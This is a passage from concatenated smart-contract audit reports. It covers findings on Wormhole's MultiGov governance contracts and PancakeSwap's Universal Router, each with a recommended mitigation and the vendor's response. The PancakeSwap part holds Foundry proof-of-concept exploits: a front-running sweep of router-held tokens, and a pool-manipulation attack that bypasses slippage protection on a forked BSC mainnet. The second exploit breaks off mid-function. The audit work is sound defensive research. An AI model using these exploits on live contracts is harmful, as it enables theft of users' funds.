      (ProposalBuilder builder) = _createArbitraryProposal();

      vm.startPrank(delegates[0]);
      proposalId =
        governor.propose(builder.targets(), builder.values(), builder.calldatas(), "hi");
      vm.stopPrank();

      _jumpToActiveProposal(proposalId);
    }


    bytes memory ethCall = QueryTest.buildEthCallWithFinalityRequestBytes(
      bytes("0x1296c33"), // random blockId: a hash of the block number
      "finalized", // finality
      1, // numCallData
      QueryTest.buildEthCallDataBytes(
        _spokeContract, abi.encodeWithSignature("proposalVotes(uint256)", proposalId)
      )
    );

    console2.log("block number %i", block.number);
    console2.log("block timestamp %i", block.timestamp);
    console2.log("voting period %i", governor.votingPeriod());
    console2.log("proposal vote start %i", governor.proposalSnapshot(proposalId));

    bytes memory ethCallResp = QueryTest.buildEthCallWithFinalityResponseBytes(
      uint64(block.number), // block number
      blockhash(block.number), // block hash
      uint64(block.timestamp), // block time US //@note send the timestamp before vote start
      1, // numResults
      QueryTest.buildEthCallResultBytes(
        abi.encode(
          proposalId,
          SpokeCountingFractional.ProposalVote({
            againstVotes: uint128(200),
            forVotes: uint128(10000),
            abstainVotes: uint128(800)
          })
        )
      ) // results
    );


    bytes memory _queryRequestBytes = QueryTest.buildOffChainQueryRequestBytes(
      VERSION, // version
      0, // nonce
      1, // num per chain requests
      abi.encodePacked(
        QueryTest.buildPerChainRequestBytes(
          queryChainId, // chainId
          hubVotePool.QT_ETH_CALL_WITH_FINALITY(),
          ethCall
        )
      )
    );


  bytes memory _resp = QueryTest.buildQueryResponseBytes(
      VERSION, // version
      OFF_CHAIN_SENDER, // sender chain id
      OFF_CHAIN_SIGNATURE, // signature
      _queryRequestBytes, // query request
      1, // num per chain responses
      abi.encodePacked(
        QueryTest.buildPerChainResponseBytes(queryChainId , hubVotePool.QT_ETH_CALL_WITH_FINALITY(), ethCallResp)
      )
    );

    vm.warp(governor.proposalDeadline(proposalId) + 1); // move beyond proposal deadline - no longer active
    IWormhole.Signature[] memory signatures = _getSignatures(_resp);

    vm.expectRevert(abi.encodeWithSelector(IGovernor.GovernorUnexpectedProposalState.selector, proposalId, IGovernor.ProposalState.Defeated, bytes32(1 << uint8(IGovernor.ProposalState.Active))));
    hubVotePool.crossChainVote(_resp, signatures);
  }
}
```

**Recommended Mitigation:** Instead of immediately calling `castVote` on Governor, consider implementing a custom vote aggregation in `HubVotePool` contract. After the voting period ends, a separate function in `HubVotePool` can submit the aggregated cross-chain votes to `Governor`. This voting after voting period ends can only be allowed for `HubVotePool` within a specific time period after voting ends. Main idea from a security standpoint is to avoid a scenario where legitimate votes cast on a spoke chain are not considered in the final tally on hub chain.

**Wormhole Foundation**
Acknowledged.

**Cyfrin:** Acknowledged.



### Potential de-synchronization of spoke registries between `HubVotePool` and `HubEvmSpokeAggregateProposer`

**Description:** The system maintains two separate registries for spoke chain addresses: one in `HubVotePool` and another in `HubEvmSpokeAggregateProposer`.

These registries use different mechanisms and can be updated independently:

`HubVotePool` uses a checkpoint-based system:

```solidity
mapping(uint16 emitterChain => Checkpoints.Trace256 emitterAddress) internal emitterRegistry;
```
`HubEvmSpokeAggregateProposer` uses a simple mapping:

```solidity
mapping(uint16 wormholeChainId => address spokeVoteAggregator) public registeredSpokes;
```
The update mechanisms also are different:

- `HubVotePool` registry can be updated directly by its owner.
- `HubEvmSpokeAggregateProposer` registry is updated through governance proposals executed by HubGovernor.

This design creates a risk of the two registries becoming out of sync, potentially leading to inconsistent behavior in the cross-chain voting system.

**Impact:** Out-of-sync spoke registries may consider votes valid for one operation (eg. vote aggregation for proposers) but invalid for other operation (eg. hub pool voting). As a result, users might create proposals using votes that are no longer valid for the HubPool.

**Recommended Mitigation:** Consider having a single source of truth for both the `HubVotePool` and `HubEvmSpokeAggregateProposer` contracts. In general, a checkpoint based registry is more robust than a simple mapping used in `HubEvmSpokeAggregateProposer`, which does not track historical changes.

**Wormhole Foundation**
Acknowledged.

**Cyfrin:** Acknowledged.


### Lack of minimum threshold for `maxQueryTimestampOffset` in `HubEvmSpokeAggregateProposer`

**Description:** In the `HubEvmSpokeAggregateProposer` contract, the `setMaxQueryTimestampOffset` function allows the owner to set a new value for `maxQueryTimestampOffset` without enforcing a minimum threshold. The current implementation only checks that the new value is not zero:

```solidity
function _setMaxQueryTimestampOffset(uint48 _newMaxQueryTimestampOffset) internal {
    if (_newMaxQueryTimestampOffset == 0) revert InvalidOffset();
    emit MaxQueryTimestampOffsetUpdated(maxQueryTimestampOffset, _newMaxQueryTimestampOffset);
    maxQueryTimestampOffset = _newMaxQueryTimestampOffset;
}
```

**Impact:** This lack of a lower bound could potentially allow the offset to be set to an impractically low value, which could disrupt the cross-chain vote aggregation for creating proposals.

**Recommended Mitigation:** Consider implementing a minimum threshold for the `maxQueryTimestampOffset`.

**Wormhole Foundation**
Acknowledged.

**Cyfrin:** Acknowledged.



### Inconsistent vote weight windows enable potential voting power manipulation

**Description:** Current implementation allows for independent setting of vote weight windows on the hub chain (via `HubGovernor`) and spoke chains (via SpokeVoteAggregator). This can lead to inconsistencies in how voting power is calculated across different chains for the same governance proposals.

In `HubGovernor.sol`, it is set via governance:

```solidity
function setVoteWeightWindow(uint48 _weightWindow) external {
    _checkGovernance();
    _setVoteWeightWindow(_weightWindow);
}
```

In `SpokeVoteAggregator.sol`, it is set by the owner of contract:
```solidity
function setVoteWeightWindow(uint48 _voteWeightWindow) public {
    _checkOwner();
    _setVoteWeightWindow(_voteWeightWindow);
}
```
There is no mechanism to ensure these settings remain synchronized across chains.

**Impact:** The inconsistency in vote weight windows can lead to voting power discrepancies. Since voting power is determined as the minimum token holding over vote weight window, having different windows could result in unfair voting representation across different spoke chains.

**Recommended Mitigation:** Consider making `SpokeAirlock` contract the owner of the `SpokeVoteAggregator`. All key parameter changes would then be subject to Hub Governance approval.  In general, consider avoiding multiple admins for each spoke chain and delegate all authority to the Hub Governance.

 Although [README](https://github.com/wormhole-foundation/example-multigov/tree/7513aa59000819dd21266c2be16e18a0ae8a595f?tab=readme-ov-file#spokevoteaggregator) suggests that `SpokeAirlock` is indeed the owner of `SpokeVoteAggregator`, implementation for the same is missing in the [`DeploySpokeContractsBaseImpl.sol`](https://github.com/wormhole-foundation/example-multigov/blob/7513aa59000819dd21266c2be16e18a0ae8a595f/evm/script/DeploySpokeContractsBaseImpl.sol#L48) deployment script.

 **Wormhole Foundation**
Fixed in [PR 184](https://github.com/wormhole-foundation/example-multigov/pull/184/commits/5adab8a44b41ceac3ead4abc7d88983800e0f2eb)

**Cyfrin:** Verified.



\clearpage
## Informational


### Missing event emissions when changing critical parameters

**Description:** Critical parameters are changed without corresponding event emissions. This leads to a lack of overall transparency.

`HubVotePool::setGovernor` does not emit an event when governor is changed.

```solidity
  function setGovernor(address _newGovernor) external {
    _checkOwner();
    hubGovernor = IGovernor(_newGovernor);
    //@audit @info missing event check for this critical change
  }
```

`HubProposalExtender::extendProposal` does not emit an event when a proposal is extended.

```solidity
function extendProposal(uint256 _proposalId) external {
    uint256 exists = governor.proposalSnapshot(_proposalId);
    if (msg.sender != voteExtenderAdmin) revert AddressCannotExtendProposal();
    if (exists == 0) revert ProposalDoesNotExist();
    if (extendedDeadlines[_proposalId] != 0) revert ProposalAlreadyExtended();

    IGovernor.ProposalState state = governor.state(_proposalId);
    if (state != IGovernor.ProposalState.Active && state != IGovernor.ProposalState.Pending) {
      revert ProposalCannotBeExtended();
    }

    extendedDeadlines[_proposalId] = uint48(governor.proposalDeadline(_proposalId)) + extensionDuration;
   //@audit @info missing event emission
  }
```

`HubGovernor::_setWhitelistedProposer` does not emit an even when whitelisted proposer is updated.

```solidity
  function _setWhitelistedProposer(address _proposer) internal {
    emit WhitelistedProposerUpdated(whitelistedProposer, _proposer);
    whitelistedProposer = _proposer; //@audit lack of zero addy check
  }
```
**Recommended Mitigation:** Consider adding events when critical contract parameters are changed.

**Wormhole Foundation**
Fixed in [PR 173](https://github.com/wormhole-foundation/example-multigov/pull/173/commits).

**Cyfrin:** Verified.


### Potential long-term failure in `HubGovernor::getVotes` due to uint32 Casting of Timestamps

**Description:** In the `GovernorMinimumWeightedVoteWindow::_getVotes` function, there's a casting of the `_windowStart` value to uint32:

```solidity
uint256 _startPos = _upperLookupRecent(_account, uint32(_windowStart), _numCheckpoints);
```
This casting limits the maximum timestamp that can be handled to 4,294,967,295 (year 2106). After this date, any attempt to cast a larger timestamp to uint32 will cause a transaction revert due to an arithmetic overflow error.

**Impact:** The impact of this issue is currently minimal as it will not manifest for next 80 years. After this period, the contract will fail to process votes, effectively breaking core functionality.

**Recommended Mitigation:** Consider replacing uint32 with uint64 in the casting operation.

**Wormhole Foundation**
Acknowledged.

**Cyfrin:** Acknowledged.


### Proposal deadline extension is allowed even in `Pending` state

**Description:** `HubProposalExtender::extendProposal` function allows the extension of proposal deadlines even when the proposal is in a `Pending` state. This allows the `VoteExtenderAdmin` to extend the deadline of a proposal before the voting period has even started.

However, during the `Pending` state, spoke chains cannot aggregate votes to send to the hub pool, making the extension ineffective for its intended purpose of allowing more time for vote aggregation in scenarios where Wormhole queries is not able to submit messages to the Hub chain.

```solidity
function extendProposal(uint256 _proposalId) external {
    // ... (other checks)
    IGovernor.ProposalState state = governor.state(_proposalId);
    if (state != IGovernor.ProposalState.Active && state != IGovernor.ProposalState.Pending) {
        revert ProposalCannotBeExtended();
    }
    // ... (extension logic)
}
```
**Recommended Mitigation:** Consider modifying the `extendProposal` function to only allow extensions for Active proposals.

**Wormhole Foundation**
Fixed in [PR 170](https://github.com/wormhole-foundation/example-multigov/pull/170/commits/48c4965edf8b8c125199fc399758929c88e64f48).

**Cyfrin:** Verified.



### Missing deployment script for `HubEvmSpokeAggregateProposer`

**Description:** Deployment script in `DEployHubContractsBaseImpls.s.sol` does not include code for deploying `HubEvmSpokeAggregateProposer`.


**Recommended Mitigation:** Consider updating the script to deploy `HubEvmSpokeAggregateProposer` with documented initial values for `maxQueryTimestampOffset` parameter.

**Wormhole Foundation**
Acknowledged.

**Cyfrin:** Acknowledged.



### Missing implementation to cast fractional vote with signature

**Description:** On SpokeVoteAggregator, there is no function to sign a voting message with fractional voting params. While a user can cast nominal votes via signature, there is no provision to cast fractional votes via signature.

**Recommended Mitigation:** Consider adding a function that allows users to sign a voting message by passing fractional voting params.

**Wormhole Foundation**
Acknowledged.

**Cyfrin:** Acknowledged.


### Inconsistent documentation related to the deployment of `SpokeMessageExecutor`

**Description:** In the project README, the governance upgrade path for the `SpokeMessageExecutor` is given as follows

```text
`SpokeMessageExecutor`: Deploy a new contract and then update the hub dispatcher to call the new spoke message executor.
```

SpokeMessageExecutor is upgradeable, so there is no need to deploy a new contract. Doing as suggested in the README infact leads to replay attack risk.

The README is outdated and inconsistent with the current system design.


**Recommended Mitigation:** Consider upgrading the project README to reflect the current design where `SpokeExecutor`is an upgradeable contract.

**Wormhole Foundation**
Fixed in [PR 176](https://github.com/wormhole-foundation/example-multigov/pull/176/commits/41b4bdaa14e045e817f525b5d4d9b9c792e6bf6c).

**Cyfrin:** Verified.

\clearpage
## Gas Optimization


### Hash comparison can be optimized

**Description:** `HubEvmSpokeDecoder::decode` does a keccak256 hash comparison to check if the blocks are finalized. One of the comparator is always constant, ie. keccak256(bytes("finalized")).  Generating hashes is expensive and can be simplified by pre-calculating this value.

```solidity
    if (keccak256(_ethCalls.requestFinality) != keccak256(bytes("finalized"))) {
      revert InvalidQueryBlock(_ethCalls.requestBlockId);
    }
```
This is gas expensive and hashing is unnecessary in this case.

**Recommended Mitigation:** Consider storing `keccak256(bytes("finalized"))` as a constant instead of computing every time.

**Wormhole Foundation**
Fixed in [PR 169](https://github.com/wormhole-foundation/example-multigov/pull/169/commits/1230774ca68795e7f5ed30c9036a95ebe33b6c2c).

**Cyfrin:** Verified.


### `_checkProposalEligibility` gas optimization

**Description:** Current implementation of the `HubEvmSpokeAggregateProposer::_checkProposalEligibility` processes all spoke chain responses before checking if the proposal threshold is met. Additionally, the hub vote weight is added to the total vote weight after all votes from spoke chains are counted.

This approach may lead to unnecessary gas consumption in cases where the proposer's voting power on the hub chain alone, or combined with a subset of spoke chains, is sufficient to meet the proposal threshold.

**Recommended Mitigation:** Consider adding the hub vote weight first instead of adding it last. Modify the function to check the proposal threshold after adding the hub vote weight and after processing each spoke chain response. This allows for early termination if the threshold is met, potentially saving gas on unnecessary computations.

```solidity
function _checkProposalEligibility(bytes memory _queryResponseRaw, IWormhole.Signature[] memory _signatures)
    internal
    view
    returns (bool)
{
    // ... (initial setup)

    uint256 _hubVoteWeight = HUB_GOVERNOR.getVotes(msg.sender, _sharedQueryBlockTime / 1_000_000);
    _totalVoteWeight = _hubVoteWeight;

    uint256 _proposalThreshold = HUB_GOVERNOR.proposalThreshold();
    if (_totalVoteWeight >= _proposalThreshold) {
        return true;
    }

    for (uint256 i = 0; i < _queryResponse.responses.length; i++) {
        // ... (process each spoke chain response)
        uint256 _voteWeight = abi.decode(_ethCalls.result[0].result, (uint256));
        _totalVoteWeight += _voteWeight;

        if (_totalVoteWeight >= _proposalThreshold) {
            return true;
        }
    }

    return false;
}
```

**Wormhole Foundation**
Acknowledged.

**Cyfrin:** Acknowledged.

\clearpage

------ FILE END car/reports_md/2024-10-04-cyfrin-wormhole-multigov-v2.0.md ------


------ FILE START car/reports_md/2024-10-07-cyfrin-pancakeswap-v2.0.md ------

**Lead Auditors**

[0kage](https://twitter.com/0kage_eth)

[Hans](https://twitter.com/hansfriese)

**Assisting Auditors**



---

# Findings
## Medium Risk


### Multi-step migration process risks token loss due to front-running

**Description:** The current implementation of the Universal Router allows for a multi-step migration process from V3 to V4 positions. This process, as demonstrated in the tests `test_v3PositionManager_burn` and `test_v4CLPositionmanager_Mint`, can be executed in separate transactions. In the first step, tokens are collected from the V3 position and left in the router contract. In a subsequent step, these tokens are used to mint a V4 position.

An incorrect migration due to user error or otherwise, introduces front running attack vectors. Between these steps, the tokens reside in the router contract allowing an attacker to front-run the second step of the migration process and steal the user's tokens.

The core issue stems from the fact that the `execute()` function does not automatically sweep remaining tokens back to the user at the end of each transaction. This leaves any unused or (un)intentionally stored tokens vulnerable to unauthorized sweeping by external parties.

**Impact:** Users who perform the migration in separate steps, or who fail to include a sweep command at the end of their transaction, risk losing all tokens collected from their V3 position.

The impact is exacerbated by the fact that users might naturally perceive the migration as a two-step process (exit V3, then enter V4), not realizing the risks of leaving tokens in the router between these steps.

**Proof of Concept:** Add the test to `V3ToV4Migration.t.sol`

```solidity
    function test_v3PositionManager_burn_frontrunnable() public {
        vm.startPrank(alice);

        // before: verify token0/token1 balance in router
        assertEq(token0.balanceOf(address(router)), 0);
        assertEq(token1.balanceOf(address(router)), 0);

        // build up the params for (permit -> decrease -> collect)
        (,,,,,,, uint128 liqudiity,,,,) = v3Nfpm.positions(v3TokenId);
        (uint8 v, bytes32 r, bytes32 s) = _getErc721PermitSignature(address(router), v3TokenId, block.timestamp);
        IV3NonfungiblePositionManager.DecreaseLiquidityParams memory decreaseParams = IV3NonfungiblePositionManager
            .DecreaseLiquidityParams({
            tokenId: v3TokenId,
            liquidity: liqudiity,
            amount0Min: 0,
            amount1Min: 0,
            deadline: block.timestamp
        });
        IV3NonfungiblePositionManager.CollectParams memory collectParam = IV3NonfungiblePositionManager.CollectParams({
            tokenId: v3TokenId,
            recipient: address(router),
            amount0Max: type(uint128).max,
            amount1Max: type(uint128).max
        });

        // build up univeral router commands
        bytes memory commands = abi.encodePacked(
            bytes1(uint8(Commands.V3_POSITION_MANAGER_PERMIT)),
            bytes1(uint8(Commands.V3_POSITION_MANAGER_CALL)), // decrease
            bytes1(uint8(Commands.V3_POSITION_MANAGER_CALL)), // collect
            bytes1(uint8(Commands.V3_POSITION_MANAGER_CALL)) // burn
        );

        bytes[] memory inputs = new bytes[](4);
        inputs[0] = abi.encodePacked(
            IERC721Permit.permit.selector, abi.encode(address(router), v3TokenId, block.timestamp, v, r, s)
        );
        inputs[1] =
            abi.encodePacked(IV3NonfungiblePositionManager.decreaseLiquidity.selector, abi.encode(decreaseParams));
        inputs[2] = abi.encodePacked(IV3NonfungiblePositionManager.collect.selector, abi.encode(collectParam));
        inputs[3] = abi.encodePacked(IV3NonfungiblePositionManager.burn.selector, abi.encode(v3TokenId));

        snapStart("V3ToV4MigrationTest#test_v3PositionManager_burn");
        router.execute(commands, inputs);
        snapEnd();

        // after: verify token0/token1 balance in router
        assertEq(token0.balanceOf(address(router)), 9999999999999999999);
        assertEq(token1.balanceOf(address(router)), 9999999999999999999);

        // Attacker front-runs and sweeps the funds
        address attacker = makeAddr("ATTACKER");
        assertEq(token0.balanceOf(attacker), 0);
        assertEq(token1.balanceOf(attacker), 0);
        uint256 routerBalanceBeforeAttack0 = token0.balanceOf(address(router));
        uint256 routerBalanceBeforeAttack1 = token1.balanceOf(address(router));

        vm.startPrank(attacker);

        bytes memory attackerCommands = abi.encodePacked(
            bytes1(uint8(Commands.SWEEP)),
            bytes1(uint8(Commands.SWEEP))
        );

        bytes[] memory attackerInputs = new bytes[](2);
        attackerInputs[0] = abi.encode(address(token0), attacker, 0);
        attackerInputs[1] = abi.encode(address(token1), attacker, 0);

        router.execute(attackerCommands, attackerInputs);

        vm.stopPrank();

        uint256 routerBalanceAfterAttack0 = token0.balanceOf(address(router));
        uint256 routerBalanceAfterAttack1 = token1.balanceOf(address(router));

        assertEq(routerBalanceAfterAttack0, 0, "Router should have no token0 left");
        assertEq(routerBalanceAfterAttack1, 0, "Router should have no token1 left");
        assertEq(token0.balanceOf(attacker), routerBalanceBeforeAttack0);
        assertEq(token1.balanceOf(attacker), routerBalanceBeforeAttack1);
    }
```

**Recommended Mitigation:** Consider implementing an automatic token sweep at the end of each execute() call. Any tokens left in the router should be returned to the transaction initiator. Alternatively, provide helper functions or clear guidelines for combining V3 exit and V4 entry into a single transaction and/or add clear comments to the V3_POSITION_MANAGER_CALL execution.

 **Pancake Swap**
Fixed in [PR 22](https://github.com/pancakeswap/pancake-v4-universal-router/pull/22/commits/eb6898050a667611667abd859591f406131382ef)

**Cyfrin:** Verified. Added in-line comments as recommended for V3_POSITION_MANAGER_CALL.


### MEV Bots can bypass slippage protection in Universal Router's stable swap implementation

**Description:** The current implementation of slippage protection in the Universal Router's stable swap functionality is vulnerable to a bypass. The stableSwapExactInput function checks the balance of the output token after the swap to ensure it meets the minimum amount specified. However, this check does not account for any pre-existing balance of the output token in the router contract. In a multi-command transaction scenario, it's possible for the router to have a balance of the output token before the swap is executed, which could lead to the slippage check passing even if the actual swap output is less than the specified minimum.

Let's explore the contracts to spot where and why the MEV protection can be lost

[`StableSwapRouter`](https://github.com/pancakeswap/pancake-v4-universal-router/blob/main/src/modules/pancakeswap/StableSwapRouter.sol#L68-L88)
```solidity
function stableSwapExactInput(
    address recipient,
    uint256 amountIn,
    uint256 amountOutMinimum,
    address[] calldata path,
    uint256[] calldata flag,
    address payer
) internal {
   // code....

    uint256 amountOut = tokenOut.balanceOf(address(this));
    if (amountOut < amountOutMinimum) revert StableTooLittleReceived(); //@audit this check is ineffective
    if (recipient != address(this)) pay(address(tokenOut), recipient, amountOut);
}
```

The above check assumes that the entire balance of tokenOut in the router is a result of the current swap, which may not always be the case.

**Impact:** MEV Bots can steal from users when swapping an exactIn on a StablePool. In a worst-case scenario, users could receive significantly less value from their swaps than intended, while their transactions appear to have executed successfully with slippage protection.

**Proof of Concept:** Create a new file in the [test/](https://github.com/pancakeswap/pancake-v4-universal-router/tree/main/test) and add the below code to run the PoC:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import {ERC20} from "solmate/src/tokens/ERC20.sol";
// import {StableSwapTest} from "./stableSwap/StableSwap.t.sol";

import {IPermit2} from "permit2/src/interfaces/IPermit2.sol";
import {IPancakeV2Factory} from "../src/modules/pancakeswap/v2/interfaces/IPancakeV2Factory.sol";

import {IStableSwapFactory} from "../src/interfaces/IStableSwapFactory.sol";
import {IStableSwapInfo} from "../src/interfaces/IStableSwapInfo.sol";

import {UniversalRouter} from "../src/UniversalRouter.sol";
import {ActionConstants} from "pancake-v4-periphery/src/libraries/ActionConstants.sol";
import {Constants} from "../src/libraries/Constants.sol";
import {Commands} from "../src/libraries/Commands.sol";
import {RouterParameters} from "../src/base/RouterImmutables.sol";

contract Exploit is Test {
  ERC20 constant USDC = ERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
  ERC20 constant BUSDC = ERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
  ERC20 constant CAKE = ERC20(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82);
  ERC20 constant WETH9 = ERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

  IPancakeV2Factory constant FACTORY = IPancakeV2Factory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);
  IPermit2 constant PERMIT2 = IPermit2(0x31c2F6fcFf4F8759b3Bd5Bf0e1084A055615c768);

  IStableSwapFactory STABLE_FACTORY = IStableSwapFactory(0x25a55f9f2279A54951133D503490342b50E5cd15);
  IStableSwapInfo STABLE_INFO = IStableSwapInfo(0x150c8AbEB487137acCC541925408e73b92F39A50);

  address helperUser = vm.addr(999);
  address user = vm.addr(1234);
  address attacker = vm.addr(1111);

  UniversalRouter public router;

  uint256 WETH_AMOUNT;
  uint256 CAKE_AMOUNT;

  uint256 ATTACKER_BUSDC_AMOUNT = 10_000_000e18;

  function setUp() public {
        // BSC: May-09-2024 03:05:23 AM +UTC
        vm.createSelectFork(vm.envString("FORK_URL"), 38560000);
        // setUpTokens();

        RouterParameters memory params = RouterParameters({
            permit2: address(PERMIT2),
            weth9: address(WETH9),
            v2Factory: address(FACTORY),
            v3Factory: address(0),
            v3Deployer: address(0),
            v2InitCodeHash: bytes32(0x00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5),
            v3InitCodeHash: bytes32(0),
            stableFactory: address(STABLE_FACTORY),
            stableInfo: address(STABLE_INFO),
            v4Vault: address(0),
            v4ClPoolManager: address(0),
            v4BinPoolManager: address(0),
            v3NFTPositionManager: address(0),
            v4ClPositionManager: address(0),
            v4BinPositionManager: address(0)
        });
        router = new UniversalRouter(params);

        if (FACTORY.getPair(address(WETH9), address(USDC)) == address(0)) {
            revert("v2Pair doesn't exist");
        }

        if (FACTORY.getPair(address(CAKE), address(BUSDC)) == address(0)) {
            revert("v2Pair doesn't exist");
        }

        if (STABLE_FACTORY.getPairInfo(address(USDC), address(BUSDC)).swapContract == address(0)) {
            revert("StablePair doesn't exist");
        }

        WETH_AMOUNT = 1e18;
        CAKE_AMOUNT = 250e18;

        {
          vm.startPrank(helperUser);
          deal(address(WETH9), helperUser, WETH_AMOUNT);
          deal(address(CAKE), helperUser, CAKE_AMOUNT);
          ERC20(address(WETH9)).approve(address(PERMIT2), type(uint256).max);
          ERC20(address(CAKE)).approve(address(PERMIT2), type(uint256).max);
          ERC20(address(USDC)).approve(address(PERMIT2), type(uint256).max);
          PERMIT2.approve(address(WETH9), address(router), type(uint160).max, type(uint48).max);
          PERMIT2.approve(address(CAKE), address(router), type(uint160).max, type(uint48).max);
          PERMIT2.approve(address(USDC), address(router), type(uint160).max, type(uint48).max);
          vm.stopPrank();
        }

        {
          vm.startPrank(user);
          deal(address(WETH9), user, WETH_AMOUNT);
          deal(address(CAKE), user, CAKE_AMOUNT);
          ERC20(address(WETH9)).approve(address(PERMIT2), type(uint256).max);
          ERC20(address(CAKE)).approve(address(PERMIT2), type(uint256).max);
          PERMIT2.approve(address(WETH9), address(router), type(uint160).max, type(uint48).max);
          PERMIT2.approve(address(CAKE), address(router), type(uint160).max, type(uint48).max);
          vm.stopPrank();
        }

        {
          vm.startPrank(attacker);
          //@audit => Attacker got 10 million USDC to manipulate the rate on the USDC/BUSDC StablePool!
          deal(address(USDC), attacker, ATTACKER_BUSDC_AMOUNT);
          ERC20(address(USDC)).approve(address(PERMIT2), type(uint256).max);
          PERMIT2.approve(address(USDC), address(router), type(uint160).max, type(uint48).max);
          vm.stopPrank();
        }
    }

    function test_happyPathWithoutAbusingBug() public {
      (address[] memory pathSwap1, address[] memory pathSwap2, address[] memory stableSwapPath, uint256[] memory pairFlag) = _helperFunction();

      //Ratio of Conversion:
        //1 WBNB ~ 595.2e18 USDC
        //1 CAKE ~ 2.66 BUSDC
        //1 USDC ~ 0.99989 BUSDC

      (uint256 weth_usdc_ratio, uint256 cake_busdc_ratio, uint256 usdc_busdc_ratio) = _computeConvertionRatios(pathSwap1, pathSwap2, stableSwapPath, pairFlag);

      //@audit => Do the user's swap!

      bytes[] memory inputsUser = new bytes[](3);
      //@audit => swap 1 WBNB for USDC and leave the USDC on the router to do smth with them
        // @audit => Should get ~590 USDC
      inputsUser[0] = abi.encode(ActionConstants.ADDRESS_THIS, WETH_AMOUNT, 0, pathSwap1, true);

      //@audit => swap 250 CAKE for BUSDC and leave the BUSDC on the router to do smth with them
        // @audit => Should get ~520 BUSDC
      inputsUser[1] = abi.encode(ActionConstants.ADDRESS_THIS, CAKE_AMOUNT, 0, pathSwap2, true);

      //@audit => Do a StableSwap of USDC to BUSDC using the USDC received on the first swap!
        // @audit => In the end, the Router should have at least 1250 BUSDC after all the swaps are completed
      inputsUser[2] = abi.encode(ActionConstants.ADDRESS_THIS, ActionConstants.CONTRACT_BALANCE, 0, stableSwapPath, pairFlag, false);

      bytes memory commandsUser = abi.encodePacked(bytes1(uint8(Commands.V2_SWAP_EXACT_IN)), bytes1(uint8(Commands.V2_SWAP_EXACT_IN)), bytes1(uint8(Commands.STABLE_SWAP_EXACT_IN)));
      vm.prank(user);
      router.execute(commandsUser, inputsUser);

      uint256 busdcReceived = BUSDC.balanceOf(address(router));
      assert(busdcReceived > 1250e18);
      console.log("busdcReceived:" , busdcReceived);

    }


    function test_explotingLackOfMevProtection() public {
      (address[] memory pathSwap1, address[] memory pathSwap2, address[] memory stableSwapPath, uint256[] memory pairFlag) = _helperFunction();

      //Ratio of Conversion:
        //1 WBNB ~ 595.2e18 USDC
        //1 CAKE ~ 2.66 BUSDC
        //1 USDC ~ 0.99989 BUSDC

      (uint256 weth_usdc_ratio, uint256 cake_busdc_ratio, uint256 usdc_busdc_ratio) = _computeConvertionRatios(pathSwap1, pathSwap2, stableSwapPath, pairFlag);

      //@audit => Attacker frontruns the users tx and manipulates the rate on the USDC/BUSDC StablePool!
      bytes[] memory inputsAttacker = new bytes[](1);
      inputsAttacker[0] = abi.encode(ActionConstants.MSG_SENDER, ATTACKER_BUSDC_AMOUNT, 0, stableSwapPath, pairFlag, true);

      bytes memory commandsSttacker = abi.encodePacked(bytes1(uint8(Commands.STABLE_SWAP_EXACT_IN)));
      vm.prank(attacker);
      router.execute(commandsSttacker, inputsAttacker);

      uint256 busdcAttackerReceived = BUSDC.balanceOf(address(attacker));
      console.log("Attacker busdcReceived:" , busdcAttackerReceived);

      //@audit => Do the user swap
      bytes[] memory inputsUser = new bytes[](3);
      //@audit => swap 1 WBNB for USDC and leave the USDC on the router to do smth with them
        // @audit => Should get ~590 USDC
      inputsUser[0] = abi.encode(ActionConstants.ADDRESS_THIS, WETH_AMOUNT, 0, pathSwap1, true);

      //@audit => swap 250 CAKE for BUSDC and leave the BUSDC on the router to do smth with them
        // @audit => Should get ~660 BUSDC
      inputsUser[1] = abi.encode(ActionConstants.ADDRESS_THIS, CAKE_AMOUNT, 0, pathSwap2, true);

      //@audit => Users sets a minimum amount of BUSDC to receive for the USDC of the first swap. (At least a 90%!)
        //@audit => The user is explicitly setting the minimum amount of BUSDC to receive as ~530 BUSDC!
      //@audit => Because of the bug, the minimum amount of BUSDC the user is willing to receive will be ignored!
      uint256 busdc_amountOutMinimum = (((weth_usdc_ratio * usdc_busdc_ratio / 1e18) * 9) / 10);

      //@audit => Do a StableSwap of USDC to BUSDC using the USDC received on the first swap!
        // @audit => In the end, the Router should have at least 1250 BUSDC after all the swaps are completed
      inputsUser[2] = abi.encode(ActionConstants.ADDRESS_THIS, ActionConstants.CONTRACT_BALANCE, busdc_amountOutMinimum, stableSwapPath, pairFlag, false);

      bytes memory commandsUser = abi.encodePacked(bytes1(uint8(Commands.V2_SWAP_EXACT_IN)), bytes1(uint8(Commands.V2_SWAP_EXACT_IN)), bytes1(uint8(Commands.STABLE_SWAP_EXACT_IN)));
      vm.prank(user);
      router.execute(commandsUser, inputsUser);

      //@audit => The router only has ~660 BUSDC after swapping 1 WBNB and 250 CAKE
        //@audit => Even though the user specified a minimum amount when swapping the USDC that was received on the first swap, because of the bug, such protection is ignored.
      uint256 busdcReceived = BUSDC.balanceOf(address(router));
      assert(busdcReceived < 675e18);
      console.log("busdcReceived:" , busdcReceived);

      //@audit => Results: The user swapped 1 WBNB and 250 CAKE worth ~1250 USD, and in reality it only received less than 675 USD.
      //@audit => The attacker manipulated the ratio on the StablePool which allows him to steal on the swap of USDC ==> BUSDC
    }

    function _helperFunction() internal returns(address[] memory pathSwap1, address[] memory pathSwap2, address[] memory stableSwapPath, uint256[] memory pairFlag) {
      pathSwap1 = new address[](2);     // WBNB => USDC
      pathSwap1[0] = address(WETH9);
      pathSwap1[1] = address(USDC);

      pathSwap2 = new address[](2);     // CAKE => BUSDC
      pathSwap2[0] = address(CAKE);
      pathSwap2[1] = address(BUSDC);

      stableSwapPath = new address[](2); // USDC => BUSDC
      stableSwapPath[0] = address(USDC);
      stableSwapPath[1] = address(BUSDC);
      pairFlag = new uint256[](1);
      pairFlag[0] = 2; // 2 is the flag to indicate StableSwapTwoPool
    }

    function _computeConvertionRatios(address[] memory pathSwap1, address[] memory pathSwap2, address[] memory stableSwapPath, uint256[] memory pairFlag) internal
